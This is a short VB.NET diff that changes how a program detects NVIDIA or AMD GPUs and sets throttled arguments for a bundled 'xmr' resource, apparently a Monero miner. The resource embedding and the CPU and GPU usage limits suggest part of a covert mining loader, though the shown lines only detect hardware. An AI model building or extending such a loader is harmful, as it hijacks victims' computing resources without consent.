@@ -103,7 +103,7 @@ Public Class Program
             Args = "--cuda-bfactor=12 --cuda-bsleep=100"
             xmr = GetTheResource("#nvidia")
         ElseIf GetTheSpec.ToLower.Contains("amd") Then
-            Args = "--opencl-platform=0 --opencl-devices=0,1,2 --opencl-launch=1600x8,1600x8,1600x8"
+            Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
             xmr = GetTheResource("#amd")
         Else
             Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
@@ -123,12 +123,21 @@ Public Class Program
             Dim objSearcher As New System.Management.ManagementObjectSearcher(objquery)
 
             For Each MemObj As System.Management.ManagementObject In objSearcher.Get
+                VideoCard = VideoCard & (MemObj("VideoProcessor")) & " "
+            Next
+
+            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
+                Return VideoCard
+            End If
+
+            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                 VideoCard = VideoCard & (MemObj("Name")) & " "
             Next
 
             If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                 Return VideoCard
             End If
+
             Return ""
         Catch ex As Exception
             Return ""
